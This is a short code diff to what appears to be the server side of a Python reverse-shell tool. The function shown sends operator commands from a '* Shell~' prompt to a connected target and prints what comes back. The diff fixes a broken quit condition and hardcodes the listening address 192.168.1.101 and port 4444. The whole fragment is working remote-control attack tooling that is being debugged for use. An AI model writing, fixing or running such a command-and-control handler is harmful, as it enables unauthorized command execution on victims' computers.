@@ -18,15 +18,15 @@ def target_communication():
     while True:
         command = input('* Shell~%s:' % str(ip))
         reliable_send(command)
-        if command == 'quit'or 'q':
+        if command == 'quit'or command == 'q':
             break
         else:
             result = reliable_recv()
             print(result)
 
 
-LHOST = input('what\'s your LHOST? ')
-LPORT = input('what\'s your LPORT? ')
+LHOST = '192.168.1.101'
+LPORT = 4444
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((LHOST, int(LPORT)))
 print(LHOST)
